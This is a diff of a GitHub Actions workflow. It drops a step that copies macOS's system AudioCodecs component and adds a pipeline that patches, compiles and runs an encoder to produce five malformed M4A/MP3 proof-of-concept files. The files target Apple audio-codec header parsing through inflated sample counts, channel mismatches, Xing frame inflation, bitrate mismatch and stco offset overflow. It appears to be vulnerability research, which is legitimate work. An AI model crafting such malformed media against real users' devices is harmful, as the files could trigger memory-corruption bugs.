@@ -1,53 +1,205 @@
-name: Upload AudioCodecs Component
+name: Generate PoC Audio Files
 
 on:
   push:
     branches: [ main ]
-  workflow_dispatch: # Allows manual triggering
+  pull_request:
+    branches: [ main ]
+  workflow_dispatch:
 
 jobs:
-  upload:
-    name: Upload AudioCodecs Artifact
+  build-and-generate:
     runs-on: macos-latest
+    timeout-minutes: 30
 
     steps:
-      # Checkout the repository
-      - name: Checkout Repository
-        uses: actions/checkout@v4
-
-      # Copy AudioCodecs.component (requires sudo, but GitHub-hosted runners may have restrictions)
-      - name: Copy AudioCodecs Component
+      # Clone the repository
+      - name: Clone repository
         run: |
-          SOURCE="/System/Library/Components/AudioCodecs.component"
-          DEST_DIR="./audiocodecs_backup"
-          ZIP_FILE="./audiocodecs_backup/AudioCodecs_component.zip"
-          
-          mkdir -p "$DEST_DIR"
-          
-          if [ ! -d "$SOURCE" ]; then
-            echo "Error: AudioCodecs.component not found at $SOURCE"
-            exit 1
-          fi
-          
-          # Attempt to copy (may fail due to SIP or permissions on GitHub runner)
-          sudo cp -R "$SOURCE" "$DEST_DIR"
-          
-          if [ $? -ne 0 ]; then
-            echo "Error: Failed to copy AudioCodecs.component. Uploading pre-copied file instead."
-            exit 1
-          fi
-          
-          # Compress the file
-          cd "$DEST_DIR"
-          zip -r "$ZIP_FILE" "AudioCodecs.component"
-          
-          # Clean up
-          rm -rf "$DEST_DIR/AudioCodecs.component"
+          echo "Cloning repository at $(date)"
+          git clone https://github.com/encryptedcoderr/AppleTest/
+          cd AppleTest/apple-positional-audio-codec-invalid-header-main
+          echo "Listing directory contents at $(date)"
+          ls -l
+          echo "Repository cloned and directory listed at $(date)"
 
-      # Upload the artifact
-      - name: Upload AudioCodecs Artifact
+      # Cache FFmpeg
+      - name: Cache FFmpeg
+        uses: actions/cache@v4
+        with:
+          path: /usr/local/bin/ffmpeg
+          key: ffmpeg-${{ runner.os }}-2025-06
+          restore-keys: ffmpeg-${{ runner.os }}-
+
+      # Install FFmpeg
+      - name: Install FFmpeg
+        run: |
+          echo "Installing FFmpeg at $(date)"
+          if ! command -v ffmpeg &> /dev/null; then
+            brew install ffmpeg
+          else
+            echo "FFmpeg already installed"
+          fi
+          echo "FFmpeg installed at $(date)"
+
+      # Set up Xcode
+      - name: Set up Xcode
+        uses: maxim-lobanov/setup-xcode@v1
+        with:
+          xcode-version: '16.1'
+
+      # Verify Xcode and clang version
+      - name: Verify Xcode and clang version
+        run: |
+          echo "Verifying Xcode and clang versions at $(date)"
+          xcodebuild -version
+          clang++ --version
+          xcrun --sdk macosx --show-sdk-path
+          echo "Verification completed at $(date)"
+
+      # Check system resources
+      - name: Check system resources
+        run: |
+          echo "Checking system resources at $(date)"
+          df -h
+          system_profiler SPHardwareDataType
+          echo "System resource check completed at $(date)"
+
+      # Create PoC source files
+      - name: Create PoC source files
+        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
+        run: |
+          echo "Creating PoC source files at $(date)"
+          # PoC 1: Inflated Sample Count in stsz
+          cp encodeme.mm encodeme_poc1.mm
+          sed -i '' 's/44100/8192/g' encodeme_poc1.mm
+          sed -i '' 's/mDataByteSize = static_cast<UInt32>(44100 * channelNum * sizeof(float) + (rand() % 1000))/mDataByteSize = static_cast<UInt32>(1024 * channelNum * sizeof(float))/g' encodeme_poc1.mm
+          
+          # PoC 2: esds Channel Configuration Mismatch
+          cp encodeme.mm encodeme_poc2.mm
+          sed -i '' 's/mChannelsPerFrame = channelNum/mChannelsPerFrame = 8/g' encodeme_poc2.mm
+          sed -i '' 's/mNumberChannels = channelNum/mNumberChannels = 1/g' encodeme_poc2.mm
+          sed -i '' 's/mChannelLayoutTag = kAudioChannelLayoutTag_HOA_ACN_SN3D | 0x3/mChannelLayoutTag = kAudioChannelLayoutTag_HOA_ACN_SN3D | 0x8/g' encodeme_poc2.mm
+          
+          # PoC 3: Xing Header Frame Count Inflation (MP3 metadata in conversion step)
+          cp encodeme.mm encodeme_poc3.mm
+          sed -i '' 's/44100/2000/g' encodeme_poc3.mm
+          
+          # PoC 4: Frame Header Bitrate Mismatch (MP3)
+          cp encodeme.mm encodeme_poc4.mm
+          sed -i '' 's/mDataByteSize = static_cast<UInt32>(44100 * channelNum * sizeof(float) + (rand() % 1000))/mDataByteSize = static_cast<UInt32>(144000 \/ 1000 * 64 * channelNum)/g' encodeme_poc4.mm
+          
+          # PoC 5: stco Offset Overflow
+          cp encodeme.mm encodeme_poc5.mm
+          sed -i '' 's/44100/4096/g' encodeme_poc5.mm
+          sed -i '' 's/mDataByteSize = static_cast<UInt32>(44100 * channelNum * sizeof(float) + (rand() % 1000))/mDataByteSize = static_cast<UInt32>(100)/g' encodeme_poc5.mm
+          echo "Adding stco metadata for PoC 5"
+          sed -i '' '/AudioFileSetProperty(audioFile, kAudioFilePropertyInfoDictionary, sizeof(metadata), &metadata);/a\
+          NSDictionary *stcoMetadata = @{@"stcoOffset" : @(44100 * 44100 - 100)};\
+          AudioFileSetProperty(audioFile, kAudioFilePropertyInfoDictionary, sizeof(stcoMetadata), &stcoMetadata);' encodeme_poc5.mm
+          
+          ls -l encodeme_poc*.mm
+          echo "PoC source files created at $(date)"
+
+      # Compile PoC binaries
+      - name: Compile PoC binaries
+        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
+        run: |
+          echo "Compiling PoC binaries at $(date)"
+          for poc in {1..5}; do
+            echo "Compiling encodeme_poc$poc.mm"
+            clang++ -g -Os -std=c++2b -fmodules -fcxx-modules -fobjc-arc -arch arm64 -isysroot $(xcrun --sdk macosx --show-sdk-path) -framework AVFAudio -framework AudioToolbox encodeme_poc$poc.mm -o encodeme_poc$poc
+            if [ $? -eq 0 ]; then
+              echo "Compilation successful for encodeme_poc$poc"
+              ls -l encodeme_poc$poc
+              BINARY_SIZE=$(stat -f %z encodeme_poc$poc 2>/dev/null || stat -c %s encodeme_poc$poc 2>/dev/null)
+              echo "Binary size: $BINARY_SIZE bytes"
+            else
+              echo "Compilation failed for encodeme_poc$poc"
+              exit 1
+            fi
+          done
+          echo "PoC binaries compiled at $(date)"
+
+      # Run PoC binaries to generate M4A files
+      - name: Run PoC binaries
+        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
+        run: |
+          echo "Running PoC binaries at $(date)"
+          for poc in {1..5}; do
+            echo "Running encodeme_poc$poc"
+            chmod +x encodeme_poc$poc
+            ./encodeme_poc$poc
+            if [ $? -eq 0 ]; then
+              echo "encodeme_poc$poc executed successfully"
+              mv output_*.m4a poc${poc}.m4a || echo "No M4A file found, checking directory"
+              ls -l poc${poc}.m4a 2>/dev/null || ls -l
+            else
+              echo "encodeme_poc$poc execution failed"
+              exit 1
+            fi
+          done
+          echo "PoC binaries executed at $(date)"
+
+      # Convert M4A to MP3 and add Xing metadata for PoC 3
+      - name: Convert M4A to MP3
+        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
+        run: |
+          echo "Converting M4A to MP3 at $(date)"
+          for poc in {1..5}; do
+            if [ -f poc${poc}.m4a ]; then
+              if [ $poc -eq 3 ]; then
+                echo "Adding Xing metadata for PoC 3"
+                ffmpeg -i poc3.m4a -c:a mp3 -b:a 128k -ac 1 -metadata:s:v:0 frames=20000 poc3.mp3
+              elif [ $poc -eq 4 ]; then
+                echo "Setting high bitrate for PoC 4"
+                ffmpeg -i poc4.m4a -c:a mp3 -b:a 320k -ac 1 poc4.mp3
+              else
+                ffmpeg -i poc${poc}.m4a -c:a mp3 -b:a 128k -ac 1 poc${poc}.mp3
+              fi
+              if [ $? -eq 0 ]; then
+                echo "Conversion successful for poc${poc}.mp3"
+              else
+                echo "Conversion failed for poc${poc}.mp3"
+                exit 1
+              fi
+            else
+              echo "poc${poc}.m4a not found"
+              exit 1
+            fi
+          done
+          echo "M4A to MP3 conversion completed at $(date)"
+
+      # Verify generated files
+      - name: Verify generated files
+        working-directory: AppleTest/apple-positional-audio-codec-invalid-header-main
+        run: |
+          echo "Checking for generated files at $(date)"
+          for poc in {1..5}; do
+            for ext in m4a mp3; do
+              if [ -f poc${poc}.${ext} ]; then
+                FILE_SIZE=$(stat -f %z poc${poc}.${ext} 2>/dev/null || stat -c %s poc${poc}.${ext} 2>/dev/null)
+                echo "poc${poc}.${ext} size: $FILE_SIZE bytes"
+                if [ "$FILE_SIZE" -eq 0 ]; then
+                  echo "Error: poc${poc}.${ext} is 0 bytes"
+                  exit 1
+                fi
+                ffprobe -i poc${poc}.${ext} -show_format -show_streams -print_format json 2>/dev/null || echo "ffprobe failed for poc${poc}.${ext}"
+              else
+                echo "poc${poc}.${ext} not found"
+                exit 1
+              fi
+            done
+          done
+          echo "Generated files verified at $(date)"
+
+      # Upload artifacts
+      - name: Upload artifacts
         uses: actions/upload-artifact@v4
         with:
-          name: AudioCodecs-component
-          path: ./audiocodecs_backup/AudioCodecs_component.zip
+          name: poc-audio-files
+          path: |
+            AppleTest/apple-positional-audio-codec-invalid-header-main/poc*.m4a
+            AppleTest/apple-positional-audio-codec-invalid-header-main/poc*.mp3
+          retention-days: 7
           if-no-files-found: error
